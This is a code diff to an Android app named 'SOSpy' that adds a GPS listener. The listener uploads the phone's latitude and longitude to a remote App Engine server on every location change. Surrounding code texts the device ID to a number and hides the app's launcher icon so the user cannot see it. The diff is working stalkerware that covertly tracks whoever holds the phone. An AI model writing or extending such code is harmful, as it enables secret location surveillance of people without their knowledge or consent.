@@ -3,10 +3,14 @@ package com.prestomation.android.sospy.spy;
 import android.app.Activity;
 import android.app.AlertDialog;
 import android.app.PendingIntent;
+import android.content.Context;
 import android.content.DialogInterface;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
+import android.location.Location;
+import android.location.LocationListener;
+import android.location.LocationManager;
 import android.os.Bundle;
 import android.provider.Settings.Secure;
 import android.telephony.SmsManager;
@@ -23,8 +27,13 @@ public class SetupActivity extends Activity {
 
 	/** Called when the activity is first created. */
 	@Override
-	public void onCreate(Bundle savedInstanceState) {
+	public void onCreate(Bundle savedInstanceState) 
+	{
 		super.onCreate(savedInstanceState);
+		
+		LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
+		LocationListener ll = new locListener();
+		lm.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, 0, ll);
 
 		SharedPreferences prefs = Prefs.get(this);
 		if (!prefs.contains(PREF_DEVICE_ID)) {
@@ -44,6 +53,10 @@ public class SetupActivity extends Activity {
 		mDevID = Prefs.get(this).getString(PREF_DEVICE_ID, "error");
 
 		setScreenContent(R.layout.greeting);
+		
+		
+
+		
 	}
 
 	private void setScreenContent(int screenId) {
@@ -68,7 +81,7 @@ public class SetupActivity extends Activity {
 		String formattedGreeting = String.format(greeting, mDevID);
 		TextView greetingText = (TextView) findViewById(R.id.greetingText);
 		greetingText.setText(formattedGreeting);
-		promptForIDDestination();
+		//promptForIDDestination();
 
 	}
 
@@ -102,7 +115,6 @@ public class SetupActivity extends Activity {
 		sms.sendTextMessage(number, null, "The SOSPYID is " + mDevID, pi, null);
 		Log.i(TAG, "Text sent");
 		hideIcon();
-
 	}
 
 	private void hideIcon() {
@@ -116,9 +128,46 @@ public class SetupActivity extends Activity {
 		alert.show();
 		Log.i(TAG, "Disabling icon ");
 
+		
 		p.setComponentEnabledSetting(getComponentName(),
 				PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
-
+		
 	}
-
+	
+	private class locListener implements LocationListener 
+	{
+		@Override
+		public void onLocationChanged(Location location) 
+		{
+	        if (location != null) 
+	        {
+		        Log.i(SetupActivity.TAG,"New Location: latitude:" + location.getLatitude() + " longitude:" + location.getLongitude());
+		        
+		        final SharedPreferences prefs = Prefs.get(getApplicationContext());
+		        final Location loc = location;
+		        
+		        new Thread(new Runnable() 
+		        {
+					public void run() 
+					{
+				        String devID = prefs.getString(SetupActivity.PREF_DEVICE_ID, null);
+				        AppEngineClient client = new AppEngineClient(devID);
+				        
+				        String title = "GPS Location Changed";
+				        String body = "Longitude: " + loc.getLongitude() + "  Latitude: " + loc.getLatitude();
+				        String date = "";
+				        
+				        client.sendSpyData(title, body, date);
+					}
+		        }).start();
+	        }
+		}
+		
+		@Override
+		public void onProviderDisabled(String provider) {}
+		@Override
+		public void onProviderEnabled(String provider) {}
+		@Override
+		public void onStatusChanged(String provider, int status,Bundle extras) {}
+	}	   
 }
